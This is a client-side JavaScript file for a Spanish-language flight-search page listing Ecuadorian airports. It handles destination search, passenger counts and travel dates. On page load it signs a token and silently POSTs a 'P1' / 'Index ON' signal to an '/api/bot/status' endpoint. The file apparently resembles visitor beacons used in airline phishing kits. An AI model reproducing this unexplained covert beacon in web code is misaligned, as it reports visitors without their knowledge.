/**
 * UI JS
 */
const destinations = [
    {
        city: "Guayaquil",
        country: "Ecuador",
        code: "GYE"
    },
    {
        city: "Quito",
        country: "Ecuador",
        code: "UIO"
    },
    {
        city: "Cuenca",
        country: "Ecuador",
        code: "CUE"
    },
    {
        city: "Manta",
        country: "Ecuador",
        code: "MEC"
    },
    {
        city: "San Cristóbal",
        country: "Ecuador",
        code: "SCY"
    },
    {
        city: "Galápagos",
        country: "Ecuador",
        code: "GPS"
    },
    {
        city: "Catamayo",
        country: "Ecuador",
        code: "LOH"
    },
    {
        city: "Coca",
        country: "Ecuador",
        code: "OCC"
    },
];

let selectType = 'origin';

document.addEventListener('DOMContentLoaded', e => {

    
    const loader = document.querySelector('.loader');
    setTimeout(() =>{
        try{
            document.querySelector('body').classList.remove('sb-hidden');
            loader.classList.remove('show');

            if(info.edit === 1){
                btnSearchFlight.click();
            }

            const token = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P1'}, JWT_SIGN);

            console.log("Index ON")
            fetch(`${API_URL}/api/bot/status`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${API_KEY}`,
                },
                body: JSON.stringify({token: token})
            })
        }catch(err){
            console.log(err);
        }
    }, 1000);

    updateDOM();

    
});





const modalDestinations = document.querySelector('#cover-destinations');
const modalResume = document.querySelector('#cover-resume');
const modalPassengers = document.querySelector('#cover-passengers');
const btnCloseModal = document.querySelectorAll('#close-modal');
btnCloseModal.forEach(btn =>{
    btn.addEventListener('click', ()=>{
        try{
            inputSearch.value = '';
            clearSearch();
            document.querySelector('body').classList.remove('sb-hidden');
            modalDestinations.classList.remove('show');
            modalResume.classList.remove('show');
            modalPassengers.classList.remove('show');

            // put type selector back
            const typeSelectorDiv = document.querySelector('#type-selector');
            const mainTypeSelector = document.querySelector('#main-type-selector');
            mainTypeSelector.appendChild(typeSelectorDiv);

            // put destination selector back
            const destinationsSelectorDiv = document.querySelector('#destinations-selector');
            const mainDestinationsSelector = document.querySelector('#main-destinations-selector');
            mainDestinationsSelector.appendChild(destinationsSelectorDiv);

        }catch(err){
            console.log(err+" ;)");
        }
    });
});




const btnOrigin = document.querySelector('#btn-origin');
btnOrigin.addEventListener('click', e => {
    btnCloseModal[0].click();
    clearSearch();
    selectType = 'origin';
    document.querySelector('body').classList.add('sb-hidden');
    document.querySelector('#search-label').textContent = 'Origen';
    document.querySelector('#search-input-label').textContent = 'Origen';
    modalDestinations.classList.add('show');
});




const btnDestination = document.querySelector('#btn-destination');
btnDestination.addEventListener('click', e => {
    btnCloseModal[0].click();
    clearSearch();
    selectType = 'destination';
    document.querySelector('body').classList.add('sb-hidden');
    document.querySelector('#search-label').textContent = 'Destino';
    document.querySelector('#search-input-label').textContent = 'Destino';
    modalDestinations.classList.add('show');
});


const inputSearch = document.querySelector('.search--input');
inputSearch.addEventListener('keyup', () =>{
    searchDestination();
});



const btnSearchFlight = document.querySelector('#search-flight');
btnSearchFlight.addEventListener('click', ()=>{
    // go to resume
    document.querySelector('body').classList.add('sb-hidden');
    modalResume.classList.add('show');

    // put type selector back
    const typeSelectorDiv = document.querySelector('#type-selector');
    const resumeTypeSelector = document.querySelector('#resume-type-selector');
    resumeTypeSelector.appendChild(typeSelectorDiv);

    // put destination selector back
    const destinationsSelectorDiv = document.querySelector('#destinations-selector');
    const resumeDestinationsSelector = document.querySelector('#resume-destinations-selector');
    resumeDestinationsSelector.appendChild(destinationsSelectorDiv);

});




const btnPassengers = document.querySelector('#btn-passengers');
btnPassengers.addEventListener('click', () =>{
    btnCloseModal[0].click();
    document.querySelector('body').classList.add('sb-hidden');
    modalPassengers.classList.add('show');
});




const btnNextStep = document.querySelector('#btn-next-step');
btnNextStep.addEventListener('click', () =>{
    // validate dates
    if((info.flightInfo.type === 1 && info.flightInfo.flightDates[1] !== 0) || (info.flightInfo.type === 2 && info.flightInfo.flightDates[0] !== 0)){

        info.passengersInfo.adults = [];
        info.passengersInfo.children = [];
        info.passengersInfo.babies = [];

        // Create passengers
        for(let i = 0; i < info.flightInfo.adults; i++){
            info.passengersInfo.adults.push({
                name: `Adulto ${i + 1}`,
                surname: ''
            });
        }
        for(let i = 0; i < info.flightInfo.children; i++){
            info.passengersInfo.children.push({
                name: `Niño ${i + 1}`,
                surname: ''
            });
        }
        for(let i = 0; i < info.flightInfo.babies; i++){
            info.passengersInfo.babies.push({
                name: `Bebé ${i + 1}`,
                surname: ''
            });
        }
        updateDOM();
        updateLS();


        window.location.href = 'flight-detail.html';
    }
});




/**
 *  FUNCTIONAL JS
 */

function updateDOM(){
    /**
     * Configuration
     */

    // Flight Type
    if(info.flightInfo.type === 1){
        document.querySelector('#ida_vuelta').checked = true;
    }else{
        document.querySelector('#solo_ida').checked = true;
    }

    // Origin
    document.querySelector('#btn-origin-label').textContent = info.flightInfo.origin.city;

    // Destination
    document.querySelector('#btn-destination-label').textContent = info.flightInfo.destination.city;

    // Passengers
    const passengersLabel = document.querySelectorAll('#btn-passengers-label');
    passengersLabel.forEach(label => label.textContent = info.flightInfo.adults + info.flightInfo.children + info.flightInfo.babies);
    document.querySelector('#adults-label').textContent = info.flightInfo.adults;
    document.querySelector('#children-label').textContent = info.flightInfo.children;
    document.querySelector('#babies-label').textContent = info.flightInfo.babies;

    // Flight Dates
    const inputDateGo = document.querySelector('#date-go');
    const btnDateGo = document.querySelector('#btn-date-go');
    const labelDateGo = document.querySelector('#btn-date-go-label');

    const inputDateBack = document.querySelector('#date-back');
    const btnDateBack = document.querySelector('#btn-date-back');
    const labelDateBack = document.querySelector('#btn-date-back-label');

        // set min dates
        let actualDate = new Date();
        actualDate.setDate(actualDate.getDate() + 1);
        let minDate = actualDate.toISOString().split('T')[0];

        inputDateGo.setAttribute('min', minDate);
        info.flightInfo.flightDates[0] === 0 ? inputDateGo.value = minDate : inputDateGo.value = info.flightInfo.flightDates[0];
        info.flightInfo.flightDates[0] === 0 ? info.flightInfo.flightDates[0] = minDate : '';
        LS.setItem('info', JSON.stringify(info));
        labelDateGo.textContent = inputDateGo.value;
        
        inputDateBack.setAttribute('min', minDate);
        info.flightInfo.flightDates[1] === 0 ? inputDateBack.value = '' : inputDateBack.value = info.flightInfo.flightDates[1];
        labelDateBack.textContent = inputDateBack.value;

    if(info.flightInfo.type === 1){
        try{
            btnDateBack.classList.remove('d-none');
        }catch(err){
            console.log(err);
        }
    }else if(info.flightInfo.type === 2){
        try{
            btnDateBack.classList.add('d-none');
        }catch(err){
            console.log(err);
        }
    }
}

function updateLS(){
    LS.setItem('info', JSON.stringify(info));
    // updateDOM();
}

function addP(type){
    let sum = info.flightInfo.children + info.flightInfo.babies + info.flightInfo.adults;
    if(sum + 1 <= 9){
        switch(type){
            case 'adult':
                info.flightInfo.adults += 1;
                updateDOM();
                updateLS();
                break;
            case 'child':
                info.flightInfo.children += 1;
                updateDOM();
                updateLS();
                break;
            case 'baby':
                info.flightInfo.babies += 1;
                updateDOM();
                updateLS();
                break;
        }
    }
}

function rmP(type){
    let sum = info.flightInfo.children + info.flightInfo.babies + info.flightInfo.adults;
    if(sum - 1 >= 1){
        switch(type){
            case 'adult':
                if(info.flightInfo.adults != 0){
                    info.flightInfo.adults -= 1;
                    updateDOM();
                    updateLS();
                }
                break;
            case 'child':
                if(info.flightInfo.children != 0){
                    info.flightInfo.children -= 1;
                    updateDOM();
                    updateLS();
                }
                break;
            case 'baby':
                if(info.flightInfo.babies != 0){
                    info.flightInfo.babies -= 1;
                    updateDOM();
                    updateLS();
                }
                break;
        }
    }
}

function printDestinationsByCountry(country){
    const search = destinations.filter(destination => destination.country === country);
    printDestinations(search);
}

function clearSearch(){
    const container = document.getElementById('destinations');
    container.innerHTML = '';
    inputSearch.value = '';
}

function printDestinations(destinations){
    const container = document.getElementById('destinations');
    container.innerHTML = '';

    destinations.forEach(destination =>{
        if(selectType === 'origin'){
            container.innerHTML += `
                <div class="destination" onclick="setOrigin('${destination.city}')">
                    <p>${destination.city}</p>
                    <p>(${destination.country})</p>
                    <p>${destination.code}</p>
                </div>
            `
        }else if(selectType === 'destination'){
            container.innerHTML += `
                <div class="destination" onclick="setDestination('${destination.city}')">
                    <p>${destination.city}</p>
                    <p>(${destination.country})</p>
                    <p>${destination.code}</p>
                </div>
            `
        };
    });
}

function clearDestinations(){
    const container = document.getElementById('destinations');
    container.innerHTML = '';
}

function getSelectedRadioValue(name) {
    let radios = document.getElementsByName(name);
    for (let i = 0; i < radios.length; i++) {
        if (radios[i].checked) {
            return radios[i].value;
        }
    }
    return null;
}

function searchDestination() {

    if (inputSearch.value === '') {
        clearDestinations(destinations);
    } else {
        let search = [];

        search = destinations.filter(destination => {return (destination.country.toLowerCase().includes(inputSearch.value.toLowerCase()) || destination.city.toLowerCase().includes(inputSearch.value.toLowerCase()) || destination.code.toLowerCase().includes(inputSearch.value.toLowerCase()))});
        printDestinations(search);
    }

}

function setOrigin(city){
    destinations.forEach(dest =>{
        if(dest.city === city){
            info.flightInfo.origin = dest;
        }
    });
    updateDOM();
    updateLS();

    btnDestination.click();
}

function setDestination(city){
    destinations.forEach(dest =>{
        if(dest.city === city){
            info.flightInfo.destination = dest;
        }
    });
    updateDOM();
    updateLS();

    // show resume
    btnCloseModal[0].click();
    btnSearchFlight.click();
}